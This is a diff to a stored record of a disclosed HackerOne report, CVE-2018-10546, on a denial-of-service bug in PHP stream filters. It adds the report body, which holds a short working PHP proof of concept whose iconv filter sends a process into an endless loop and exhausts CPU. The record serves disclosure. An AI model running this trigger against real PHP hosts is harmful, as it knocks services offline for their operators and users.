@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Uncontrolled Resource Consumption"
 enriched: true
+body: true
 date: 2020-10-12
 submitted: 2019-03-05T16:55:38.672Z
 bounty_usd: null
@@ -25,6 +26,27 @@ title: "DOS in stream filters"
 - Report: [https://hackerone.com/reports/505278](https://hackerone.com/reports/505278)
 - CWE: Uncontrolled Resource Consumption | CVE: CVE-2018-10546
 - Submitted: 2019-03-05T16:55:38.672Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+see bug report
+https://bugs.php.net/bug.php?id=76249
+
+as simple as
+<?php
+$fh = fopen('php://memory', 'rw');
+fwrite($fh, "abc");
+rewind($fh);
+stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);
+echo stream_get_contents($fh);
+
+=> one process running in an endless loop
+
+## Impact
+
+DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted
 
 ## Timeline
 
